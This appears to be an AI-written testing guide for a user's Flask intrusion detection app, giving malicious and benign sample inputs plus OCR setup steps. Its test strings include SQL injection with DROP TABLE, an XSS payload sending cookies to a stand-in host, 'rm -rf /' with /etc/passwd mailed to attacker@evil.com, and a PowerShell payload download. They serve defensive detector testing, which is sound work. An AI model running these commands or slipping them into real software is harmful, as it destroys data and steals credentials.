# 🧪 Complete Testing Guide - Intrusion Detection System

## 🎯 **READY-TO-USE TEST DATA**

I've created all the test files you requested. Here's what you can test immediately:

---

## 📝 **TEXT ANALYSIS TESTS**

### 🔴 **MALICIOUS EXAMPLES (Copy and paste these into the text box):**

#### Test 1: SQL Injection
```
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --
UNION SELECT username, password FROM admin_users; DROP TABLE users;
```
**Expected Result**: 🚨 HIGH severity - SQL injection patterns detected

#### Test 2: XSS Attack  
```
<script>alert('Your session has been hijacked!');</script>
<img src="x" onerror="document.location='http://malicious-site.com/steal?cookie='+document.cookie">
```
**Expected Result**: 🚨 HIGH severity - XSS attack patterns detected

#### Test 3: Command Injection
```
user@example.com; rm -rf /; cat /etc/passwd | mail attacker@evil.com
powershell.exe -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\temp\malware.exe'"
```
**Expected Result**: 🚨 CRITICAL severity - Command injection patterns detected

### 🟢 **NORMAL EXAMPLES (Should be clean):**

#### Test 4: Normal User Input
```
Hello, I would like to update my profile information. My name is John Doe and I work as a software engineer. Please help me change my contact details.
```
**Expected Result**: ✅ No intrusion detected

#### Test 5: System Message
```
System backup completed successfully at 2024-01-15 10:30:00. All files have been archived to the backup server. Next scheduled backup: 2024-01-16 10:30:00.
```
**Expected Result**: ✅ No intrusion detected

#### Test 6: Customer Support
```
I'm having trouble accessing my account dashboard. When I click on the settings menu, nothing happens. Could you please help me resolve this issue? My account ID is 12345.
```
**Expected Result**: ✅ No intrusion detected

---

## 📊 **CSV FILE TESTS**

I've created 6 CSV files for you to upload:

### 🔴 **MALICIOUS CSV FILES:**

1. **`test_malicious_1.csv`** - SQL Injection & XSS
   - Contains: SQL injection, XSS scripts, command injection
   - **Expected**: 🚨 CRITICAL/HIGH severity threats detected

2. **`test_malicious_2.csv`** - Phishing Attempts  
   - Contains: Phishing emails, lottery scams, urgent account messages
   - **Expected**: 🚨 MEDIUM severity - Phishing patterns detected

3. **`test_malicious_3.csv`** - Network Attack Tools
   - Contains: nmap, metasploit, sqlmap, hydra signatures
   - **Expected**: 🚨 HIGH severity - Network attack tools detected

### 🟢 **NORMAL CSV FILES:**

4. **`test_normal_1.csv`** - User Activity Log
   - Contains: Normal login, file access, email activities  
   - **Expected**: ✅ No intrusion detected

5. **`test_normal_2.csv`** - System Maintenance
   - Contains: Backup logs, server status, database health
   - **Expected**: ✅ No intrusion detected

6. **`test_normal_3.csv`** - Support Tickets
   - Contains: Customer support requests, billing questions
   - **Expected**: ✅ No intrusion detected

---

## 🖼️ **IMAGE ANALYSIS** (Requires OCR Installation)

### 🚨 **OCR Installation Issue**
Your error: "tesseract is not installed or not in your path"

### 📥 **Quick Fix:**
1. **Download**: https://github.com/UB-Mannheim/tesseract/wiki
2. **Install** the Windows .exe file
3. **Add to PATH**: Add `C:\Program Files\Tesseract-OCR` to your system PATH
4. **Restart** your Flask app

### 🎯 **Image Test Ideas** (Create these as PNG/JPG files):

#### 🔴 **Malicious Images** (Create with Paint/any editor):

**Image 1**: Text containing:
```
Username: admin
Password: ' OR 1=1; DROP TABLE users; --
```

**Image 2**: Text containing:
```
<script>alert('XSS Attack!');</script>
```

**Image 3**: Text containing:
```
Command: rm -rf /; cat /etc/passwd
```

#### 🟢 **Normal Images**:

**Image 4**: Text containing:
```
System Status: All services running
Last backup: January 15, 2024
```

**Image 5**: Text containing:
```
Name: John Doe
Department: IT Support  
Email: john.doe@company.com
```

**Image 6**: Text containing:
```
Meeting Notes: Weekly standup
Topics: Project updates, planning
```

---

## 🚀 **HOW TO TEST RIGHT NOW**

### Step 1: Start Your Flask App
```bash
python app_flask.py
```

### Step 2: Open Browser
Go to: `http://localhost:5000`

### Step 3: Navigate to IDS Page
Click: "Intrusion Detection" in the sidebar

### Step 4: Test Text Analysis
1. Scroll to "Simple Intrusion Detection"
2. Copy/paste the malicious text examples above
3. Click "Analyze Text"
4. Watch for red alerts with threat details!

### Step 5: Test CSV Analysis  
1. Click "Choose File" under CSV Analysis
2. Upload one of the `test_malicious_*.csv` files
3. Click "Analyze CSV"
4. See comprehensive threat breakdown!

### Step 6: Fix OCR (Optional)
1. Install Tesseract OCR (see guide above)
2. Create simple images with malicious text
3. Upload and test image analysis

---

## 🎯 **EXPECTED RESULTS**

### ✅ **What Should Work:**
- **Text Analysis**: All 6 examples should work perfectly
- **CSV Analysis**: All 6 CSV files should analyze correctly
- **Malicious Detection**: Red alerts, severity levels, pattern details
- **Clean Detection**: Green "No intrusion detected" messages

### ❌ **Known Issue:**
- **Image Analysis**: Will show OCR installation error until Tesseract is installed

---

## 📋 **FILES CREATED FOR YOU:**

```
C:\Users\hanum\Downloads\Cyber\
├── test_data_text_examples.md     # Text examples guide
├── test_malicious_1.csv           # SQL injection CSV
├── test_malicious_2.csv           # Phishing CSV  
├── test_malicious_3.csv           # Network attacks CSV
├── test_normal_1.csv              # Normal user activity
├── test_normal_2.csv              # System maintenance  
├── test_normal_3.csv              # Support tickets
├── OCR_SETUP_GUIDE.md             # Image setup instructions
└── COMPLETE_TESTING_GUIDE.md      # This file
```

## 🎉 **Start Testing!**

You now have everything needed to thoroughly test your intrusion detection system. The text and CSV analysis will work immediately, and image analysis will work after installing Tesseract OCR.

**Happy Testing!** 🛡️✨
